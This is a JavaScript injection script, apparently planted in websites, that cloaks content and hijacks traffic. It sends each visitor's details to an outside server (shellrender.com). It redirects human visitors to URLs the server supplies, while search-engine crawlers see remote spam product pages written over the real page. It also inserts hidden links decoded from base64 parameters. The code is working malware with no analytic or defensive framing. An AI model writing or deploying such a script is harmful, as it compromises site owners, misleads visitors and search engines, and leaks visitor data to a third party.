(() => {

    const shellConfig = {
        pageTypes: ['h', 'c', 'd'],
        gbyApiUrl: 'https://shellrender.com/api',
        ebayImagePrefix: 'https://i.ebayimg.com/images/',
        merchantId: 1,
        defaultPageNo: 1,
        defaultPageSize: 100,
        homeHref: location.origin,
        defaultReferrer: document.referrer || 'insert-shell.js'
    };

    const BOT_REGEX = /(google|bing|yandex)/i;
    const API_TIMEOUT = 10000;
    let isQs = true;

    function getPageInfo() {
        const params = Object.fromEntries(new URLSearchParams(window.location.search).entries());
        const queryStringMode = detectQueryStringMode(params);

        if(queryStringMode){
            return queryStringMode;
        }

        const hashtag = window.location.hash.slice(1);
        if (hashtag) {
            isQs = false;
            return detectHashtagMode(hashtag);
        }

        return null;
    }

    function isBot() {
        return BOT_REGEX.test(navigator.userAgent);
    }

    function withTimeout(promise, ms) {
        return Promise.race([
            promise,
            new Promise((_, reject) => setTimeout(() => reject(new Error('TIMEOUT')), ms))
        ]);
    }

    function detectHashtagMode(hashtag) {
        const decodedHashtag = decodeURIComponent(hashtag);

        const targetUrl = targetUrlDecode(decodedHashtag);
        if (targetUrl && /^(https?|http):\/\/(?:[a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}/.test(targetUrl)) return { type: 'target', url: targetUrl };
        
        if (decodedHashtag === 'home') return { type: 'home' };
        if (/^\d+$/.test(decodedHashtag)) return { type: 'detail', id: decodedHashtag };
        if (/^[a-zA-Z0-9-]+$/.test(decodedHashtag)) {
            const match = decodedHashtag.match(/^([a-zA-Z-]+)-(\d+)-(\d+)$/);
            if (match) {
                return { type: 'collection', id: match[1], pageNo: match[2], size: match[3] };
            }  
                return { type: 'collection', id: decodedHashtag };
        }

        return null;
    }

    function detectQueryStringMode(params) {
        if (params.h) return { type: 'home' };
        if (params.c) return { type: 'collection', id: params.c, pageNo: params.n , size: params.s};
        if (params.d) return { type: 'detail', id: params.d };
        if (params.t) return { type: 'target', url: targetUrlDecode(params.t) };
        return null;
    }

    async function fetchRenderContent(url, pageInfo) {
        const payload = {
            qs: 1,
            merchant_id: shellConfig.merchantId,
            user_agent: navigator.userAgent,
            language: navigator.language,
            scheme: location.protocol,
            ip: '8.8.8.8',
            domain: location.hostname,
            url: location.href,
            home_href: shellConfig.homeHref,
            referer: shellConfig.defaultReferrer,
            page_type: pageInfo.type,
            keyword: null,
            page_no: null,
            page_size: null,
            item_id: null
        };

        if (pageInfo.type === 'detail') {
            payload.item_id = pageInfo.id || null;
        } else if (pageInfo.type === 'collection') {
            payload.keyword = pageInfo.id?.replace(/-/g, ' ') || null;
            payload.page_no = pageInfo.pageNo || shellConfig.defaultPageNo;
            payload.page_size = pageInfo.size || shellConfig.defaultPageSize;
        }

        const resp = await withTimeout(
            fetch(shellConfig.gbyApiUrl + url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            }),
            API_TIMEOUT
        );

        if (!resp.ok) throw new Error('API error');

        return resp.json();
    }

    function targetUrlDecode(url) {
        try {
            url = url.replace(/-/g, "+").replace(/_/g, "/");
            while (url.length % 4) url += "=";

            return new TextDecoder().decode(
                Uint8Array.from(atob(url), c => c.charCodeAt(0))
            );
        } catch (error) {
            return false;
        }
    }

    function processContent(html) {
        const hostname = location.hostname;
        const pathname = location.pathname;
        const search = location.search;
        const protocol = location.protocol;
        
        let result = html.replace(
            /(?:https?:\/\/[^\s"']+)?\/\?s=images_([a-zA-Z0-9_\-~]+)\.([a-zA-Z0-9]+)/g,
            (_, path, ext) => {
                return shellConfig.ebayImagePrefix + path.replace(/_/g, '/') + '.' + ext;
            }
        );
        
        function buildUrlWithParams(baseUrl, newParams, businessParams = ['c', 'd', 'n', 's', 'h']) {
            const urlParams = new URLSearchParams(search);
            
            businessParams.forEach(param => {
                urlParams.delete(param);
            });
            
            Object.keys(newParams).forEach(key => {
                if (newParams[key] !== undefined && newParams[key] !== null) {
                    urlParams.set(key, newParams[key]);
                }
            });
            
            const queryString = urlParams.toString();
            return baseUrl + pathname + (queryString ? '?' + queryString : '');
        }
        
        if (!isQs) {
            result = result.replace(
                /(https?:\/\/)?([^/"'\s]+)?\/\?c=([^_"?\s/]+)(?:_(\d+)_(\d+))?/g,
                (_, p, h, c, n, s) => {
                    if (h && h !== hostname) return _;

                    let hash = c;
                    if (n) hash += `-${n}`;
                    if (s) hash += `-${s}`;

                    p = p || protocol + '//';
                    h = h || hostname;

                    return p + h + pathname + search + '#' + hash;
                }
            );
            
            result = result.replace(
                /(https?:\/\/)?([^/"'\s]+)?\/\?d=([^_"?\s/]+)/g,
                (_, p, h, d) => {
                    if (h && h !== hostname) return _;

                    p = p || protocol + '//';
                    h = h || hostname;

                    return p + h + pathname + search + '#' + d;
                }
            );
        }
        
        if (isQs) {
            result = result.replace(
                /(https?:\/\/)?([^/"'\s]+)?\/\?c=([^_"?\s/]+)(?:_(\d+)_(\d+))?/g,
                (_, p, h, c, n, s) => {
                    if (h && h !== hostname) return _;
                    
                    p = p || protocol + '//';
                    h = h || hostname;
                    
                    const params = { c };
                    if (n) params.n = n;
                    if (s) params.s = s;

                    return buildUrlWithParams(p + h, params, ['c', 'd', 'n', 's', 'h']);
                }
            );
            
            result = result.replace(
                /(https?:\/\/)?([^/"'\s]+)?\/\?d=([^_"?\s/]+)/g,
                (_, p, h, d) => {
                    if (h && h !== hostname) return _;
                    
                    p = p || protocol + '//';
                    h = h || hostname;

                    return buildUrlWithParams(p + h, { d }, ['c', 'd', 'n', 's', 'h']);
                }
            );
        }
        
        return result;
    }

    async function main() {
        const pageInfo = getPageInfo();
        if (!pageInfo) return;

        if (pageInfo.type === 'target' && pageInfo.url) {
            const a = document.createElement('a');
            a.href = pageInfo.url;
            a.textContent = ' ';
            document.body.insertBefore(a, document.body.firstChild);
            return;
        }

        if (!isBot()) {
            const res = await fetchRenderContent('/render', pageInfo);
            if(!res.redirect) return;
            window.location.href = res.content;
            return;
        }

        try {
            const res = await fetchRenderContent('/v2/render', pageInfo);
            if (!res?.content) return;

            let htmlContent = processContent(res.content);

            const html = htmlContent + `
                <script>
                    window.addEventListener('hashchange', function() {
                        window.location.reload();
                    });
                <\/script>
            `;

            document.open();
            document.write(html);
            document.close();
        } catch (e) {
            console.warn('render failed');
        }
    }

    main();
})();
